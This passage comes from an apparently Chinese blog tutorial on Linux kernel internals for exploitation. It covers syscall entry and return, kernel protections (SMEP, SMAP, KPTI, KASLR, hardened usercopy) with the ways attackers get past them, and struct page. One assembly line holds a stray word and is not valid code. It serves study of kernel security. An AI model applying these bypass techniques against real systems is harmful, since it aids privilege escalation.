*/</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line">movq %rsp, <span class="built_in">PER_CPU_VAR</span>(rsp_scratch)</span><br><span class="line"><span class="function">movq <span class="title">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span></span><br><span class="line"><span class="function"><span class="comment">/* Construct struct pt_regs on stack */</span></span></span><br><span class="line"><span class="function">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span></span><br><span class="line"><span class="function">pushq  <span class="title">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span></span><br><span class="line"><span class="function">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span></span><br><span class="line"><span class="function">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span></span><br><span class="line"><span class="function">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span></span><br><span class="line"><span class="function">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span></span><br><span class="line"><span class="function">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span></span><br><span class="line"><span class="function">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span></span><br><span class="line"><span class="function">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span></span><br><span class="line"><span class="function">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span></span><br><span class="line"><span class="function">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span></span><br><span class="line"><span class="function">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span></span><br><span class="line"><span class="function">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span></span><br><span class="line"><span class="function">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span></span><br><span class="line"><span class="function">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span></span><br><span class="line"><span class="function">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span></span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li>通过汇编指令判断是否为 <code>x32_abi</code>。</li>
<li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li>
</ol>
<blockquote>
<p>总结：</p>
<p>[1] 从当前进程的描述符中提取其内核栈的<code>ss0</code>及<code>esp0</code>信息。</p>
<p>[2] 使用<code>ss0</code>和<code>esp0</code>指向的内核栈将当前进程的<code>cs,eip,eflags,ss,esp</code>信息保存起来，这个过程也完成了由用户栈到内核栈的切换过程，同时保存了被暂停执行的程序的下一条指令。</p>
<p>[3] 将先前由中断向量检索得到的中断处理程序的<code>cs,eip</code>信息装入相应的寄存器，开始执行中断处理程序，这时就转到了内核态的程序执行了。</p>
</blockquote>
<h3 id="内核态-用户态"><a href="#内核态-用户态" class="headerlink" title="内核态-&gt;用户态"></a><strong>内核态-&gt;用户态</strong></h3><h4 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h4><ul>
<li>通过 <code>swapgs</code> 恢复 <code>GS</code> 值</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code> （中断返回指令）恢复到用户空间继续执行。如果使用 <code>iretq</code> 还需要通过堆栈给出用户空间的一些信息(<code>CS, eflags/rflags, esp/rsp</code> 等)，即 <code>trap_frame</code> 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">trap_frame</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></div>

<ul>
<li>对于开启了 <code>KPTI</code>（内核页表隔离），我们不能像之前那样直接 <code>swapgs; iret</code> 返回用户态，而是在返回用户态之前还需要将用户进程的页表给切换回来。</li>
</ul>
<h4 id="ARM-ARM64"><a href="#ARM-ARM64" class="headerlink" title="ARM&#x2F;ARM64"></a>ARM&#x2F;ARM64</h4><p>可以利用ret_to_user函数的gadget来进行返回。</p>
<h3 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a><strong>内核态函数</strong></h3><p>相比用户态库函数，内核态的函数有了一些变化：</p>
<ol>
<li><code>printf()</code>变更为<code>printk()</code>，但需要注意的是<code>printk()</code>不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果。</li>
<li><code>memcpy()</code>变更为<code>copy_from_user()/copy_to_user()</code>：<ul>
<li><code>copy_from_user()</code> 实现了将用户空间的数据传送到内核空间。</li>
<li><code>copy_to_user()</code> 实现了将内核空间的数据传送到用户空间。</li>
</ul>
</li>
<li><code>malloc()</code>变更为<code>kmalloc()</code>，内核态的内存分配函数，和<code>malloc()</code>相似，但使用的是 <code>slab/slub/slob</code> 分配器，多为<code>slub</code>。</li>
<li><code>free()</code>变更为<code>kfree()</code>，同 <code>kmalloc()</code>。</li>
</ol>
<h2 id="内核保护"><a href="#内核保护" class="headerlink" title="内核保护"></a>内核保护</h2><p>这里贴一个<a class="link"   target="_blank" rel="noopener" href="https://github.com/a13xp0p0v/linux-kernel-defence-map" >github项目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>和两个大佬文章，<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/238363" >一个<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://www.51cto.com/article/747639.html#:~:text=3%20Linux%E5%86%85%E6%A0%B8%E4%BF%9D%E6%8A%A4%E4%B8%8E%E7%BB%95%E8%BF%87%201%203.1%20KASLR%20%E4%BF%9D%E6%8A%A4%20linux%E5%86%85%E6%A0%B8%EF%BC%882005%E5%B9%B4%EF%BC%89%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81KASLR%E3%80%82%20KASLR%EF%BC%88Kernel,SMEP&SMAP%E4%BF%9D%E6%8A%A4%20linux%E5%86%85%E6%A0%B8%E4%BB%8E3.0%EF%BC%882011%E5%B9%B48%E6%9C%88%EF%BC%89%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81SMEP%EF%BC%8C3.7%EF%BC%882012%E5%B9%B412%E6%9C%88%EF%BC%89%E5%BC%80%E5%A7%8B%E6%94%AF%E6%8C%81SMAP%E3%80%82%20SMEP%EF%BC%88Supervisor%20Mode%20Execution%20Protection%EF%BC%89%E6%98%AF%E4%B8%80%E7%A7%8D%E7%94%A8%E4%BA%8E%E4%BF%9D%E6%8A%A4%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E3%80%82%20%E5%AE%83%E9%80%9A%E8%BF%87%E5%9C%A8CPU%E5%BC%80%E4%B8%80%E4%B8%AA%E6%AF%94%E7%89%B9%E4%BD%8D%EF%BC%8C%E6%9D%A5%E9%99%90%E5%88%B6%E5%86%85%E6%A0%B8%E6%80%81%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E6%80%81%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%20" >另一个<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。内核栈和内核堆的相关保护会在将栈和堆时介绍。</p>
<h3 id="空间相关"><a href="#空间相关" class="headerlink" title="空间相关"></a><strong>空间相关</strong></h3><ul>
<li><p>**<code>smep</code>**：</p>
<p><code>Supervisor Mode Execution Protection</code>(管理模式执行保护)，当处理器处于 <code>ring 0</code> 模式，执行用户空间的代码会触发页错误。（在 <code>arm</code> 中该保护称为 <code>PXN</code>)</p>
</li>
<li><p>**<code>smap</code>**：</p>
<p><code>Superivisor Mode Access Protection</code>(管理模式访问保护)，类似于 <code>smep</code>，当处理器处于 <code>ring 0</code> 模式，访问用户空间的数据会触发页错误。（在 <code>arm</code> 中该保护称为 <code>PAN</code>)</p>
</li>
<li><p>**<code>KPTI</code>**：</p>
<p><code>kernel page-table isolation</code>，内核页表隔离，进程页表隔离。旨在更好地隔离用户空间与内核空间的内存来提高安全性。<code>KPTI</code>通过完全分离用户空间与内核空间页表来解决页表泄露。一旦开启了<code>KPTI</code>，由于内核态和用户态的页表不同，所以如果使用 <code>ret2user</code>或内核执行<code>ROP</code>返回用户态时，由于内核态无法确定用户态的页表，就会报出一个段错误。可以利用内核现有的gadget将 <code>cr3</code> 与 <code>0x1000</code> 异或(第13位置0)来完成从用户态PGD转换成内核态PGD。</p>
</li>
<li><p><strong><code>CONFIG_CFI_CLANG</code>&#x3D;y</strong>:</p>
<p><code>Control Flow Integrity</code>，即控制流完整性，传统<code>ROP</code>基本宣告死亡。</p>
</li>
<li><p><strong>Hardened Usercopy</strong></p>
<p>hardened usercopy 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，<strong>主要检查拷贝过程中对内核空间中数据的读写是否会越界</strong>：</p>
<ul>
<li>读取的数据长度是否超出源 object 范围</li>
<li>写入的数据长度是否超出目的 object 范围</li>
</ul>
<p>不过这种保护 <em>不适用于内核空间内的数据拷贝</em> ，这也是目前主流的绕过手段</p>
<p>这一保护被用于 <code>copy_to_user()</code> 与 <code>copy_from_user()</code> 等数据交换 API 中。</p>
</li>
</ul>
<h3 id="地址相关"><a href="#地址相关" class="headerlink" title="地址相关"></a><strong>地址相关</strong></h3><ul>
<li><p>**<code>MMAP_MIN_ADDR</code>**：</p>
<p>内核空间和用户空间共享虚拟内存地址，因此需要防止用户空间 <code>mmap</code> 的内存从 <code>0</code> 开始，从而缓解空指针引用攻击。控制着<code>mmap</code>能够映射的最低内存地址，防止用户非法分配并访问低地址数据。不允许申请<code>NULL</code>地址 <code>mmap(0,....)</code>。</p>
</li>
<li><p>**<code>KASLR</code>**：</p>
<p><code>Kernel Address Space Layout Randomization</code>(内核地址空间布局随机化)，开启后，允许<code>kernel image</code>加载到<code>VMALLOC</code>区域的任何位置。在未开启KASLR保护机制时，内核代码段的基址为 <code>0xffffffff81000000</code>，<code>direct mapping area</code> 的基址为 <code>0xffff888000000000</code>。</p>
</li>
<li><p>**<code>FG-KASLR</code>**：</p>
<p><code>Function Granular Kernel Address Space Layout Randomization</code>细粒度的 <code>kaslr</code>，函数级别上的 <code>KASLR</code> 优化。该保护只是在代码段打乱顺序，在数据段偏移不变，例如 <code>commit_creds</code> 函数的偏移改变但是 <code>init_cred</code> 的偏移不变。</p>
</li>
</ul>
<h3 id="信息相关"><a href="#信息相关" class="headerlink" title="信息相关"></a><strong>信息相关</strong></h3><ul>
<li><p>**<code>Dmesg Restrictions</code>**：</p>
<p>通过设置<code>/proc/sys/kernel/dmesg_restrict</code>为1, 可以将<code>dmesg</code>输出的信息视为敏感信息(默认为0)</p>
</li>
<li><p>**<code>Kernel Address Display Restriction</code>**：</p>
<p>内核提供控制变量 <code>/proc/sys/kernel/kptr_restrict</code> 用于控制内核的一些输出打印。</p>
<ul>
<li><code>kptr_restrict == 2</code> :内核将符号地址打印为全 0 , root 和普通用户都没有权限.</li>
<li><code>kptr_restrict == 1</code> : root 用户有权限读取,普通用户没有权限.</li>
<li><code>kptr_restrict == 0</code> : root 和普通用户都可以读取.</li>
</ul>
<p><code>/proc/kallsyms</code>的内容需要<code>root</code>权限才能查看，如果以非<code>root</code>用户权限查看将显示地址为<code>0</code>。<code>kallsyms</code> 抽取了内核用到的所有函数地址(全局的,静态的)和非栈数据变量地址,生成一个数据块,作为只读数据链接进 <code>kernel image</code> 。要在内核中启用 <code>kallsyms</code> 功能,须设置 <code>CONFIG_KALLSYMS</code> 选项为 <code>y</code> ,如果要在 <code>kallsyms</code> 中包含全部符号信息,须设置 <code>CONFIG_KALLSYMS_ALL</code> 为 <code>y</code> 。<code>kallsyms</code> 表位于 <code>/proc/kallsyms</code> ，<code>kernel</code> 中的 <code>mod_tree</code> 处存放着各个模块加载的地址。</p>
</li>
</ul>
<h3 id="数据相关"><a href="#数据相关" class="headerlink" title="数据相关"></a><strong>数据相关</strong></h3><ul>
<li><p>**<code>HARDENED_USERCOPY</code>**：</p>
<p><code>hardened usercopy</code> 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，主要检查拷贝过程中对内核空间中数据的读写是否会越界，读取的数据长度是否超出源 <code>object</code> 范围，写入的数据长度是否超出目的 <code>object</code> 范围。不过这种保护不适用于内核空间内的数据拷贝 ，这也是目前主流的绕过手段这一保护被用于在使用 <code>copy_to_user()</code> 与 <code>copy_from_user()</code> 等数据交换 API 时用 <code>__check_object_size</code> 检查是否越界。</p>
</li>
<li><p>**<code>STATIC_USERMODEHELPER</code>**：</p>
<p>禁掉了对于 <code>modprobe_path</code> 和 <code>core_pattern</code> 的利用（只读区域）。</p>
</li>
</ul>
<h2 id="Linux-内核内存管理"><a href="#Linux-内核内存管理" class="headerlink" title="Linux 内核内存管理"></a>Linux 内核内存管理</h2><p>详细的 Linux 内核内存管理后续会专门新续一篇文，下文只是简述一下。</p>
<h3 id="物理内存"><a href="#物理内存" class="headerlink" title="物理内存"></a>物理内存</h3><p><a class="link"   target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/130163993" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   target="_blank" rel="noopener" href="https://www.zhihu.com/column/c_1444822980567805952" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="page"><a href="#page" class="headerlink" title="page"></a>page</h4><p>Linux 内核内存管理的实现以 <code>page</code> 数据结构为核心，其他的内存管理设施都基于 <code>page</code> 数据结构，如 <code>VMA</code> 管理、缺页中断、<code>RMAP</code>、页面分配与回收等。<code>page</code> 数据结构定义在 <code>include/linux/mm_types.h</code> 头文件中，大量使用了 C 语言的联合体(union)来优化其数据结构的大小，因为每个物理页面都需要一个 <code>page</code> 数据结构来跟踪和管理这些物理页面的使用情况，所以管理成本很高。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">// 第一部分，标志位</span></span><br><span class="line">    <span class="comment">/* 页面的标志位集合 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags; </span><br><span class="line">					</span><br><span class="line">    <span class="comment">// 第二部分，40字节的联合体</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	    <span class="comment">// 管理匿名页面/文件映射页面</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="comment">/* LRU 链表节点，匿名页面或文件映射页面会通过该成员添加到 LRU 链表中 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span> </span><br><span class="line">            <span class="comment">/* 表示页面所指向的地址空间 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            <span class="comment">/* 表示这个页面在一个映射中的序号或偏移量 */</span></span><br><span class="line">			<span class="type">pgoff_t</span> index;</span><br><span class="line">            <span class="comment">/* 指向私有数据的指针 */</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">		&#125;;</span><br><span class="line">        <span class="comment">// 管理 slab/slob/slub 分配器</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span>	</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="comment">/* 在 slub 分配器中使用 */</span></span><br><span class="line">					<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line">					<span class="type">int</span> pages;	</span><br><span class="line">					<span class="type">int</span> pobjects;	</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">            <span class="comment">/* slab 缓存描述符，slab 分配器中的第一个物理页面的 page 数据结构中的 slab cache 指向 slab 缓存描述符 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">            <span class="comment">/* 管理区。管理区可以看作一个数组，数组的每个成员占用 1 字节，每个成员代表一个 slab 对象 */</span></span><br><span class="line">			<span class="type">void</span> *freelist;		</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="comment">/* 在 slab 分配器中用来指向第一个 slab 对象的起始地址 */</span></span><br><span class="line">				<span class="type">void</span> *s_mem;	</span><br><span class="line">				<span class="type">unsigned</span> <span class="type">long</span> counters;		</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span>			</span><br><span class="line">					<span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">					<span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">					<span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">				&#125;;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> compound_head;	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">char</span> compound_dtor;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">char</span> compound_order;</span><br><span class="line">			<span class="type">atomic_t</span> compound_mapcount;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _compound_pad_1;	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _compound_pad_2;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span></span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">// 管理页表</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _pt_pad_1;	</span><br><span class="line">			<span class="type">pgtable_t</span> pmd_huge_pte;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _pt_pad_2;</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> </span><br><span class="line">				<span class="type">atomic_t</span> pt_frag_refcount; </span><br><span class="line">			&#125;;</span><br><span class="line">            <span class="comment">/* 用于保护页表操作的自旋锁，通常在更新页表时候需要这个锁以进行保护 */</span></span><br><span class="line">			<span class="type">spinlock_t</span> ptl;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">// 管理 ZONE_DEVICE 页面</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> hmm_data;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> _zd_pad_1;	</span><br><span class="line">		&#125;;</span><br><span class="line">        <span class="comment">/* RCU 锁，在 slab 分配器中释放slab 的物理页面 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="comment">// 第三部分，4字节的联合体，管理 _mapcount 等</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 用于统计 _mapcount */</span></span><br><span class="line">		<span class="type">atomic_t</span> _mapcount;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> page_type;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        *  表示slab分配器中活跃对象的数量。当为0时，表示这个slab分配器中没有活跃对象，可以销毁这个slab分配器。</span></span><br><span class="line"><span class="comment">        *  活跃对象就是已经被迁移到对象缓冲池中的对象 </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> active;		</span><br><span class="line">		<span class="type">int</span> units;			</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">// 第四部分，_refcount 引用计数</span></span><br><span class="line">	<span class="type">atomic_t</span> _refcount;</span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure></div>

<h4 id="page-中的重要字段"><a href="#page-中的重要字段" class="headerlink" title="page 中的重要字段"></a>page 中的重要字段</h4><h5 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h5><p><code>flags</code> 成员是页面的标志位集合，标志位是内存管理中非常重要的部分，具体定义在 <code>include/linux/page-flags.h</code> 文件中，重要的标志位如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 表示页面已经上锁了。如果该位置位，说明页面已经上锁，内存管理的其他模块不能访问这个页面，以防发生竞争 */</span></span><br><span class="line">	PG_locked,		<span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">    <span class="comment">/* 用于控制页面的活跃程度，在 kswapd 页面回收中使用 */</span></span><br><span class="line">	PG_referenced,</span><br><span class="line">    <span class="comment">/* 表示页面的数据已经从块设备成功读取。 */</span></span><br><span class="line">	PG_uptodate,</span><br><span class="line">    <span class="comment">/* 表示页面内容发生改变，这个页面为脏页，即页面的内容被改写后还没有和外部存储器进行过同步操作 */</span></span><br><span class="line">	PG_dirty,</span><br><span class="line">    <span class="comment">/* 表示页面在LRU链表中。LRU链表指最近最少使用(Least Recently Used)链表。内核使用LRU链表来管理活跃和不活跃页面 */</span></span><br><span class="line">	PG_lru,</span><br><span class="line">    <span class="comment">/* 用于控制页面的活跃程度，在 kswapd 页面回收中使用。 */</span></span><br><span class="line">	PG_active,</span><br><span class="line">	PG_workingset,</span><br><span class="line">    <span class="comment">/* 表示有进程在等待这个页面。 */</span></span><br><span class="line">	PG_waiters,</span><br><span class="line">    <span class="comment">/* 表示页面操作过程中发生I/O错误时会设置该位。 */</span></span><br><span class="line">	PG_error,</span><br><span class="line">    <span class="comment">/* 表示页面用于 slab 分配器。 */</span></span><br><span class="line">	PG_slab,</span><br><span class="line">	PG_owner_priv_1,	<span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">	PG_arch_1,</span><br><span class="line">	PG_reserved,</span><br><span class="line">	PG_private,		<span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">	PG_private_2,		<span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">    <span class="comment">/* 表示页面的内容正在向块设备回写。 */</span></span><br><span class="line">	PG_writeback,		<span class="comment">/* Page is under writeback */</span></span><br><span class="line">	PG_head,		<span class="comment">/* A head page */</span></span><br><span class="line">	PG_mappedtodisk,	<span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">	<span class="comment">/* 表示这个页面马上要被回收。 */</span></span><br><span class="line">    PG_reclaim,		<span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">    <span class="comment">/* 表示页面具有 swap 缓存功能，通常匿名页面才可以写回交换分区。 */</span></span><br><span class="line">	PG_swapbacked,		<span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">    <span class="comment">/* 表示页面不可被回收。 */</span></span><br><span class="line">	PG_unevictable,		<span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="comment">/* 表示页面对应的 VMA 处于 mlocked 状态。 */</span></span><br><span class="line">	PG_mlocked,		<span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">	PG_uncached,		<span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">	PG_hwpoison,		<span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">	